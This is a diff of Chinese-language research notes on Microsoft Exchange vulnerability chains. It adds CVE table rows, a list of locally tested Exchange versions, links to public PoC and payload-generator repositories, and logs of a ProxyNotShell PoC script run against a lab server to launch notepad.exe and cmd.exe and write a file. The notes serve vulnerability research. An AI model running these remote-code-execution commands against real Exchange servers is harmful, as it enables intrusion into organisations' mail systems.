@@ -38,8 +38,9 @@ ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exc
 | OWASSRF(CVE-2022-41080) | [CVE-2022-41080]() |  |  | yes |
 | TabShell(CVE-2022-41076) | [CVE-2022-41076]() |  |  | yes |
 | CVE-2022-23277 | [CVE-2022-23277]() |  |  | yes |
-| ProxyNotFound | [CVE-2021-28480](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28480) | April 13, 2021 | Pre-auth SSRF/ACL bypass | no |
-| ProxyNotFound | [CVE-2021-28481](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28481) | April 13, 2021 | Pre-auth SSRF/ACL bypass | no |
+| ProxyNotFound | [CVE-2021-28480](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28480) | April 13, 2021 | Pre-auth SSRF/ACL bypass | yes |
+| ProxyNotFound | [CVE-2021-28481](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28481) | April 13, 2021 | Pre-auth SSRF/ACL bypass | yes |
+| CVE-2023-21707 | [CVE-2023-21707](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21707) | 2023年3月9日 | Microsoft Exchange Server 远程执行代码漏洞 | yes |
 
 # ProxyLogon (completed)
 ## ProxyLogon part links
@@ -668,18 +669,69 @@ ProxyNotShell链中的第二个漏洞是CVE-2022-41082，这是一个在Exchange
 
 ProxyShell漏洞的利用只发生在端口443上(HTTPS)，而ProxyNotShell端口5985(HTTP)和5986(HTTPS)也在利用范围内
 
- - 本地测试exchange版本:
+ - 本地成功测试exchange版本:
+
+| 测试状态 | exchange版本 | File Name | 出版日期 | File Size |
+| ----------- | ----------- | ----------- | ----------- | ----------- |
+| 测试成功 | Exchange Server 2016 累计更新 CU17(KB4556414) 15.01.2044.004 | ExchangeServer2016-x64-cu17.iso | 2020/6/12 | 6.6 GB |
+| 测试失败 | Exchange Server 2019 累计更新 12 (KB5011156) 15.02.1118.007 | ExchangeServer2019-x64-CU12.ISO | 2022/4/20 | 5.8 GB |
+
 
 ## Janggggg 公开 ProxyNotShell PoC 本地测试
 
  - [Janggggg's github 公开 ProxyNotShell PoC](https://github.com/testanull/ProxyNotShell-PoC)
 
- - [poc利用截图证明](https://twitter.com/wdormann/status/1593311129874403335?s=20&t=VlkAC7azYSOHl9MF4bOc3g)
+ - [twitter poc利用截图证明](https://twitter.com/wdormann/status/1593311129874403335?s=20&t=VlkAC7azYSOHl9MF4bOc3g)
 
+使用poc脚本启动notepad.exe
 
+``` bash
+root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxynotshell.py https://192.168.14.6 'username' 'password' notepad.exe
+[+] Create powershell session
+[+] Got ShellId success
+[+] Run keeping alive request
+[+] Success keeping alive
+[+] Run cmdlet new-offlineaddressbook
+[+] Create powershell pipeline
+[+] Run keeping alive request
+[+] Success remove session
+```
 
+ - ![](pics/proxynotshell.png)
 
+ - ![](pics/proxynotshell1.png)
 
+使用poc脚本写入txt文本
+
+``` bash
+root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxynotshell.py https://192.168.14.6 'username' 'password' "echo 'proxynotshell is here' > C:\proxynotshell.txt"
+[+] Create powershell session
+[+] Got ShellId success
+[+] Run keeping alive request
+[+] Success keeping alive
+[+] Run cmdlet new-offlineaddressbook
+[+] Create powershell pipeline
+[+] Run keeping alive request
+[+] Success remove session
+```
+
+ - ![](pics/proxynotshell2.png)
+
+使用poc脚本启动cmd.exe
+
+``` bash
+root@fdvoid0:/mnt/d/1.recent-research/exchange/proxy-attackchain# python2 proxynotshell.py https://192.168.14.6 'username' 'password' cmd.exe
+[+] Create powershell session
+[+] Got ShellId success
+[+] Run keeping alive request
+[+] Success keeping alive
+[+] Run cmdlet new-offlineaddressbook
+[+] Create powershell pipeline
+[+] Run keeping alive request
+[+] Success remove session
+```
+
+ - ![](pics/proxynotshell3.png)
 
 
 
@@ -737,6 +789,16 @@ ProxyShell漏洞的利用只发生在端口443上(HTTPS)，而ProxyNotShell端�
  - [2022 Exchange 再相遇之反序列化漏洞分析（二）](https://zhuanlan.zhihu.com/p/531190946)
  - [Deep understand ASPX file handling and some related attack vectors](https://blog.viettelcybersecurity.com/deep-understand-aspx-file-handling-and-some-related-attack-vector/)
  - [The journey of exploiting a Sharepoint vulnerability.](https://blog.viettelcybersecurity.com/the-journey-of-exploiting-a-sharepoint-vulnerability/)
+
+# CVE-2023-21707
+## CVE-2023-21707 part links
+
+ - [Microsoft Exchange Powershell Remoting Deserialization leading to RCE (CVE-2023-21707)](https://starlabs.sg/blog/2023/04-microsoft-exchange-powershell-remoting-deserialization-leading-to-rce-cve-2023-21707/)
+ - [Microsoft Exchange Powershell Remoting Deserialization lead to RCE (CVE-2023–21707)](https://testbnull.medium.com/microsoft-exchange-powershell-remoting-deserialization-lead-to-rce-cve-2023-21707-4d0e6d282f02)
+ - [CVE-2023-21707 Exchange 反序列化payload生成](https://github.com/N1k0la-T/CVE-2023-21707/)
+ - [Proxynotshell 反序列化及 CVE-2023-21707 漏洞研究](https://xz.aliyun.com/t/12634?accounttraceid=97643b6cad1f48a9bc8b9b3016267889gmyp)
+
+
 
 
 
